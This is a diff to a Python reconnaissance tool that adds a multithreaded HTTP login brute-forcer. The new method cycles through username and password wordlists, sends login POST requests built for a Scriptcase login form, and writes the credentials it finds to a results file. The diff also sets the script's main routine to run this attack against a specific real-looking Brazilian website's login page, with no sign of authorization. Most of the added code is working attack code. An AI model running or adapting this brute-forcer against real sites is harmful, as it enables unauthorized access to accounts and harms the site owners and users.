@@ -11,6 +11,7 @@ import json
 import time
 from colorama import Fore, Back, Style, init
 from bs4 import BeautifulSoup
+import concurrent.futures
 
 class InternetEnumer():
     def __init__(self):
@@ -147,7 +148,7 @@ class InternetEnumer():
             negativePoint = soup.findAll('table', attrs={'class':'table table-borderless'})
             negativePoint2 = soup.findAll('p', attrs={'class':'mb-0 fw-medium'})
             
-            print(Fore.GREEN +'\n[+] Negative and Positive pointof Website'+Style.RESET_ALL+'\n')
+            print(Fore.GREEN +f'\n[+] Negative and Positive point of {url}'+Style.RESET_ALL+'\n')
             
             for x in negativePoint:
                 tableRow = x.findAll('td')
@@ -164,16 +165,126 @@ class InternetEnumer():
             print(Fore.LIGHTRED_EX + '[-] Scam Detection: Unknown Error!!!'+Style.RESET_ALL)
             print(f'Error Content: {e}')
             return False
+    
+    def http_bruteforcer(self, url):
+        '''summary:
+        this function perform bruteforce attack on http, simple and without proxy or evasion techniques
+        note: you should config Payload(HTTP Post Data) for each URL 
+        '''
+        #userFile = open('..\\wordlists\\userstop.txt','r+')
+        #passFile = open(r'../wordlists/passwords1000.txt','r+')
         
+        try:
+            with open(r'../wordlists/userstop.txt','r+') as userNames, \
+                open(r'../wordlists/passwords1000.txt','r+') as passwords:
+                    userFile = [line.strip() for line in userNames]
+                    passFile =[line.strip() for line in passwords]
+                
+        except FileNotFoundError:
+            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: File Not Found!!!'+Style.RESET_ALL)
+            return False
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error when Opening File!!!\n'+Style.RESET_ALL)
+            print(f'Error Content: {e}')
+            return False    
+       
+        result = {}
+        maybeResult = {}
         
-    def phone_locator(self):
+        def attempt_login(user, passwd):
+            payload = {
+                        'ajax':'nm',
+                        'option':'login',
+                        'field_user':user,
+                        'field_pass':passwd,
+                        'form_login':'',
+                        'language':'en_us',
+                        'keep_logged':'false'
+                    }
+            
+            try:
+                response = requests.post(url, data=payload)
+                if 'error' in response.text or response.status_code == 404:
+                    print(Fore.LIGHTRED_EX + f'[-] Http Bruteforcer: Wrong Credentials for {user}:{passwd}'+Style.RESET_ALL)
+                    
+                elif ('success' in response.text.lower() or 'welcome' in response.text.lower()) \
+                    and response.status_code == 200:         
+                            
+                    print(Fore.YELLOW + '\n [+] HTTP Bruteforcer: Credentials Founded => ' \
+                                +Fore.LIGHTGREEN_EX+f'Username: {user} Password: {passwd}'+Style.RESET_ALL)
+                    
+                    return (user, passwd, True)
+                #result.update({f'Username: {user}':f'Password: {passwd}'})
+                            
+                elif response.status_code == 400:
+                    print(Fore.RED+f'[-] Http Bruteforcer: Cant Send Request')
+                    return None
+                        
+                else:
+                    print(Fore.LIGHTYELLOW_EX + f'[-++] Maybe In-Doubt Credentials Founded => ' \
+                                +Fore.LIGHTCYAN_EX+f'Username: {user} Password: {passwd}'+Style.RESET_ALL)
+                    
+                    return (user, passwd, False)       
+                    #maybeResult.update({f'Username: {user}':f'Password: {passwd}'})
+            except requests.RequestException or requests.ConnectionError:
+                print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Internet Connection Error!!!'+Style.RESET_ALL)
+                return None
+            except Exception as e:
+                print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error in Login Attempt Function!!!\n'+Style.RESET_ALL)
+                print(f'Error Content: {e}')
+                return None
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(attempt_login,user,passwd) for user in userFile for passwd in passFile]
+            
+            for future in concurrent.futures.as_completed(futures):
+                resultTuple = future.result()
+                if resultTuple:
+                    user, passwd, success = resultTuple
+                    if success:
+                        result[f'Username {user}'] = f'Password: {passwd}'
+                    else:
+                        maybeResult[f'Username {user}'] = f'Password: {passwd}'
+                    
+                
+        #print result on screen
+        print(Fore.YELLOW+f'Credentials Founded: {len(result)} => \n'+Style.RESET_ALL)
+        print(Fore.LIGHTGREEN_EX+f'{result} \n'+Style.RESET_ALL)
+        print(Fore.YELLOW+f'Maybe In-Doubt Credentials Founded: {len(maybeResult)} \n'+Style.RESET_ALL)
+        print(Fore.WHITE+f'{maybeResult} \n'+Style.RESET_ALL)
+        
+        try:
+        #Write results in file in name result.txt
+            with open(r'../wordlists/results.txt','w') as resultFile:
+                #Write Founded Credentials
+                resultFile.write(f'Credentials Founded for {url}: {len(result)} => \n')
+                for user,passwd in result.items():
+                    resultFile.write(f'Username: {user} , Password {passwd} \n')
+                
+                #Write Maybe In-Doubt Credentials
+                resultFile.write(f'Maybe In-Doubt Credentials Founded for {url}: {len(maybeResult)} => \n')
+                for user, passwd in maybeResult.items():
+                    resultFile.write(f'Username: {user} , Password {passwd} \n')
+                
+                print(Fore.CYAN + '[+] Http Bruteforcer: Founded Credentials write to results.txt'+Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] Http Bruteforcer: Unknown Error when Writing to File!!!\n'+Style.RESET_ALL)
+        
+        #return result
+        return result, maybeResult
+    
+
+        
+    def subfinder(self):
         pass
 
 class main():
     internetEnum = InternetEnumer()
+    bruteUrl = 'https://www.contratche.com.br/scriptcase9/devel/iface/login.php'
+    
     #res = internetEnum.whois_small('sabzlearn.ir')
     #print(res[1])
-    internetEnum.scam_detection('toplearn.com')
+    internetEnum.http_bruteforcer(bruteUrl)
     
 if __name__ == '__main__':
     main()
